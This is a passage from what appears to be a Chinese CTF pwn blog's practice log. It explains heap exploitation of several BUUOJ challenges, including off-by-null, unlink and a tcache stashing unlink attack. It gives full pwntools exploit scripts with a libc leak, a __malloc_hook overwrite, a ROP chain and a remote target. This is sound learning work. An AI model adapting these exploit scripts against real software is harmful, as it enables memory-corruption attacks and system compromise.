<h2 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h2><p>改堆的free函数为system@plt，然后再改内容为&#x2F;sh，应该是可以getshell的，但是不知道为什么调试一直显示共享库损坏，就不写了</p>
<p>strchr寻找字符出现的地方</p>
<h2 id="babyfengshui-33c3-2016"><a href="#babyfengshui-33c3-2016" class="headerlink" title="babyfengshui_33c3_2016"></a>babyfengshui_33c3_2016</h2><p>首先是一个off-by-null的漏洞</p>
<p>那么应该是一个unlink然后通过unlink后的堆块，来改一个结构堆块的内容为free@got，之后改这个内容的内容堆块，即改free@go表为system然后再传入一个&#x2F;bin&#x2F;sh\x00就行了</p>
<p>但是我看了wp，发现我的思路有点过于复杂了，他的des的大小判断是根据堆块越界来看的，我们可以不让结构堆块和des堆块连在一起，就能实现越界到另一个结构堆块上</p>
<p>可以通过show函数来泄露libc基址，就越界覆盖一个free@got来show</p>
<h2 id="hitcon-ctf-2019-one-punch"><a href="#hitcon-ctf-2019-one-punch" class="headerlink" title="hitcon_ctf_2019_one_punch"></a>hitcon_ctf_2019_one_punch</h2><p>冷知识：calloc不会从tcachebin里面取堆块</p>
<p>​	首先大概的思路是先泄露libc基址，这个可以通过show unsortedbin来泄露，再泄露heap基址，之后便是构造<code>tcache stashing unlink attack</code>，之后再修改<code>__malloc_hook</code>为add rsp###,ret然后在栈中构造ROP链</p>
<p>​	仔细说一下tcache的unlink attack，它是先申请相同size的两个smallbin和tcachebin，然后再用calloc拿掉一个smallbin的时候会将剩下的smallbin放进tcachebin里，而且其中几乎没有什么check，那么我们就可以在拿取之前将smallbin的bk改成目标地址，但是要保证fd链是正确的，就可以在target-0x10上覆盖一个地址，算是大数组，也可以字节错位来实现一些小目标</p>
<h3 id="首先这题有几个问题"><a href="#首先这题有几个问题" class="headerlink" title="首先这题有几个问题"></a>首先这题有几个问题</h3><h3 id="magic函数的判定寻找过程"><a href="#magic函数的判定寻找过程" class="headerlink" title="magic函数的判定寻找过程"></a>magic函数的判定寻找过程</h3><p>首先是<code>qword_4030</code>是位于bss段上的，那么vmmap上找第一个RW段，就是bss段，然后以基址往后30就是该值，之后+0x20即在这个地址上的值加上0x20</p>
<h3 id="还有tcache结构堆块的结构"><a href="#还有tcache结构堆块的结构" class="headerlink" title="还有tcache结构堆块的结构"></a>还有tcache结构堆块的结构</h3><p>tcache结构是第一个malloc或calloc的堆块的时候初始化形成的，首先是couts数组，然后才是tcache堆，而这个couts的存储大小有1字节和2字节之分，区分于版本的大小，在较低版本都是1字节，较高版本是2字节</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">sh=process(<span class="string">&#x27;./2019_one_punch&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> x,y:sh.sendlineafter(x,y)</span><br><span class="line">sa  = <span class="keyword">lambda</span> x,y:sh.sendafter(x,y)</span><br><span class="line">su  = <span class="keyword">lambda</span> x  :sh.recvuntil(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x  :sh.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">magic</span>(<span class="params">content=<span class="built_in">bytearray</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;50086&#x27;</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx=<span class="built_in">int</span>,size=<span class="built_in">int</span>,content=<span class="built_in">bytearray</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;hero name: &#x27;</span>,size*content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rename</span>(<span class="params">idx=<span class="built_in">int</span>,content=<span class="built_in">bytearray</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;hero name: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx=<span class="built_in">int</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx=<span class="built_in">int</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">content=<span class="built_in">bytearray</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;50056&#x27;</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x120</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">recvdata2=u64(sh.recv()[<span class="number">11</span>:][:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base=recvdata2 &amp; <span class="number">0xFFFFFFFFF000</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap_base_addr======&gt;&quot;</span>,<span class="built_in">hex</span>(heap_base))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x120</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x120</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;hero name: &#x27;</span>)</span><br><span class="line">recvdata1=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">main_arena_addr=recvdata1-<span class="number">96</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;mainarena==========&gt;&quot;</span>,<span class="built_in">hex</span>(main_arena_addr))</span><br><span class="line">libc_base=main_arena_addr-<span class="number">0x1ECB80</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base_addr==========&gt;&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment">#-------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0xf0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x300</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x300</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">delete(<span class="number">1</span>)    <span class="comment">##改这个的bk</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x300</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x300</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment">#-------------------------------------------</span></span><br><span class="line">fd=heap_base+<span class="number">0x31C0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;fd==&gt;&quot;</span>,fd)</span><br><span class="line">fake_bk=heap_base+<span class="number">0x30</span>-<span class="number">0x10</span>-<span class="number">5</span></span><br><span class="line">pal=<span class="number">0x300</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(fd)+p64(fake_bk)</span><br><span class="line">rename(<span class="number">1</span>,pal)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment">#------------------------------------------</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x217</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">malloc_hook=main_arena_addr-<span class="number">0x10</span></span><br><span class="line">rename(<span class="number">0</span>,p64(malloc_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf0</span>,<span class="string">b&#x27;a&#x27;</span>)     <span class="comment">##要先放到tcache才能改tcache的数量，不然放不进去，然后再magic</span></span><br><span class="line">debug()</span><br><span class="line">magic(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">debug()</span><br><span class="line">magic(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line">magic_gadget = libc_base+<span class="number">0x000000000008cfd6</span></span><br><span class="line">payload = p64(magic_gadget)</span><br><span class="line">magic(payload) <span class="comment"># __malloc_hook --&gt; gadget(add rsp,0x48)</span></span><br><span class="line"></span><br><span class="line">p_rdi = libc_base + <span class="number">0x0000000000026542</span></span><br><span class="line">p_rsi = libc_base + <span class="number">0x0000000000026f9e</span></span><br><span class="line">p_rdx = libc_base + <span class="number">0x000000000012bda6</span></span><br><span class="line">p_rax = libc_base + <span class="number">0x0000000000047cf8</span></span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000cf6c5</span></span><br><span class="line">rop_heap = heap_base + <span class="number">0x44b0</span> <span class="comment"># &#x27;./flag&#x27; </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bad syscall</span></span><br><span class="line"><span class="comment"># rops = p64(p_rdi)+p64(rop_heap) + p64(p_rsi)+p64(0)</span></span><br><span class="line"><span class="comment"># rops += p64(libc.sym[&#x27;open&#x27;]+libc_base)</span></span><br><span class="line"><span class="comment"># rops += p64(p_rdi)+p64(3)+p64(p_rsi)+p64(heap_base+0x260)+p64(p_rdx)+p64(0x70)</span></span><br><span class="line"><span class="comment"># rops += p64(libc.sym[&#x27;read&#x27;]+libc_base)</span></span><br><span class="line"><span class="comment"># rops += p64(p_rdi)+p64(1)+p64(p_rsi)+p64(heap_base+0x260)+p64(p_rdx)+p64(0x70)</span></span><br><span class="line"><span class="comment"># rops += p64(libc.sym[&#x27;write&#x27;]+libc_base)</span></span><br><span class="line"></span><br><span class="line">rops = p64(p_rdi)+p64(rop_heap)</span><br><span class="line">rops += p64(p_rsi)+p64(<span class="number">0</span>)</span><br><span class="line">rops += p64(p_rdx)+p64(<span class="number">0</span>)</span><br><span class="line">rops += p64(p_rax)+p64(<span class="number">2</span>)</span><br><span class="line">rops += p64(syscall)</span><br><span class="line"><span class="comment">#rops += p64(libc.sym[&#x27;open&#x27;])</span></span><br><span class="line"><span class="comment">#read</span></span><br><span class="line">rops += p64(p_rdi)+p64(<span class="number">3</span>)</span><br><span class="line">rops += p64(p_rsi)+p64(heap_base+<span class="number">0x260</span>)</span><br><span class="line">rops += p64(p_rdx)+p64(<span class="number">0x70</span>)</span><br><span class="line">rops += p64(p_rax)+p64(<span class="number">0</span>)</span><br><span class="line">rops += p64(syscall)</span><br><span class="line"><span class="comment">#rops += p64(libc.sym[&#x27;read&#x27;])</span></span><br><span class="line"><span class="comment">#write</span></span><br><span class="line">rops += p64(p_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">rops += p64(p_rsi)+p64(heap_base+<span class="number">0x260</span>)</span><br><span class="line">rops += p64(p_rdx)+p64(<span class="number">0x70</span>)</span><br><span class="line">rops += p64(p_rax)+p64(<span class="number">1</span>)</span><br><span class="line">rops += p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbs(&quot;b *__malloc_hook&quot;)</span></span><br><span class="line">sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;idx: &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;hero name: &#x27;</span>,rops)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="metasequoia-2020-summoner"><a href="#metasequoia-2020-summoner" class="headerlink" title="metasequoia_2020_summoner"></a>metasequoia_2020_summoner</h2><p>本题其实只是一个纸老虎<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211053.png" alt="image-20240311224248322"></p>
<p>这便是题目的大意</p>
<p>但是他在free的时候free的其实是存储name的堆块，因此就很好构造</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">29952</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">s</span>):</span><br><span class="line">	sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">	sh.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">summon</span>(<span class="params">name</span>):</span><br><span class="line">	sh.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;summon &#x27;</span> + name)</span><br><span class="line">	sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">release</span>():</span><br><span class="line">	sh.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;release&#x27;</span>)</span><br><span class="line">	sh.recvuntil(<span class="string">&#x27;Released.\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">strike</span>():</span><br><span class="line">	sh.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;strike&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">summon(fake)</span><br><span class="line">release()</span><br><span class="line">summon(<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">strike()</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://s1nec-1o.github.io">s1nec-1o</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://s1nec-1o.github.io/2024/03/11/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">http://s1nec-1o.github.io/2024/03/11/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://s1nec-1o.github.io" target="_blank">S1nec-1o's B1og</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/traditional-pwn/">traditional pwn</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/04/28/GO-Pwn/" title="GO-Pwn"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">GO-Pwn</div></div></a></div><div class="next-post pull-right"><a href="/2024/03/03/IO%E5%87%BD%E6%95%B0%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/" title="IO函数源码阅读"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">IO函数源码阅读</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/01/27/2024-1-26%E6%B2%99%E7%9B%92%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="2024-1-26沙盒的学习"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-27</div><div class="title">2024-1-26沙盒的学习</div></div></a></div><div><a href="/2024/02/01/2024-1-31-pwnable-bookwriter/" title="2024-1-31 pwnable_bookwriter"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-01</div><div class="title">2024-1-31 pwnable_bookwriter</div></div></a></div><div><a href="/2024/01/17/2024rois-wp/" title="2024rois-wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-17</div><div class="title">2024rois-wp</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">s1nec-1o</div><div class="author-info__description">万事胜意</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">47</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">25</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="http://github.com/s1nec-1o"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">正在学习iot pwn 欢迎广大师傅与我交流</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%951"><span class="toc-number">1.</span> <span class="toc-text">buu做题记录1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9B-PWN5"><span class="toc-number">1.1.</span> <span class="toc-text">[第五空间2019 决赛]PWN5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">1.1.1.</span> <span class="toc-text">静态分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rctf-2019-babyheap"><span class="toc-number">1.2.</span> <span class="toc-text">rctf-2019-babyheap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-c-1"><span class="toc-number">1.3.</span> <span class="toc-text">ciscn_2019_c_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-n-5"><span class="toc-number">1.4.</span> <span class="toc-text">ciscn_2019_n_5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-en-2"><span class="toc-number">1.5.</span> <span class="toc-text">ciscn_2019_en_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#not-the-same-3dsctf-2016"><span class="toc-number">1.6.</span> <span class="toc-text">not_the_same_3dsctf_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ropper"><span class="toc-number">1.6.1.</span> <span class="toc-text">ropper</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E8%A7%A3"><span class="toc-number">1.6.2.</span> <span class="toc-text">二解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#iscn-2019-ne-5"><span class="toc-number">1.7.</span> <span class="toc-text">iscn_2019_ne_5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2018-rop"><span class="toc-number">1.8.</span> <span class="toc-text">2018_rop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-babyrop"><span class="toc-number">1.9.</span> <span class="toc-text">bjdctf_2020_babyrop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-babystack2"><span class="toc-number">1.10.</span> <span class="toc-text">bjdctf_2020_babystack2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-fm"><span class="toc-number">1.11.</span> <span class="toc-text">jarvisoj_fm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-tell-me-something"><span class="toc-number">1.12.</span> <span class="toc-text">jarvisoj_tell_me_something</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-es-2"><span class="toc-number">1.13.</span> <span class="toc-text">ciscn_2019_es_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HarekazeCTF2019-baby-rop2"><span class="toc-number">1.14.</span> <span class="toc-text">[HarekazeCTF2019]baby_rop2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-s-3"><span class="toc-number">1.15.</span> <span class="toc-text">ciscn_s_3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-pz-hackover-2016"><span class="toc-number">1.16.</span> <span class="toc-text">ez_pz_hackover_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyheap-0ctf-2017"><span class="toc-number">1.17.</span> <span class="toc-text">babyheap_0ctf_2017</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.17.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%A6%E5%88%B0%E7%9A%84%E4%B8%9C%E8%A5%BF"><span class="toc-number">1.17.2.</span> <span class="toc-text">学到的东西</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mrctf2020-shellcode"><span class="toc-number">1.18.</span> <span class="toc-text">mrctf2020_shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-babyrop2"><span class="toc-number">1.19.</span> <span class="toc-text">bjdctf_2020_babyrop2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-router"><span class="toc-number">1.20.</span> <span class="toc-text">bjdctf_2020_router</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ZJCTF-2019-EasyHeap"><span class="toc-number">1.21.</span> <span class="toc-text">[ZJCTF 2019]EasyHeap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 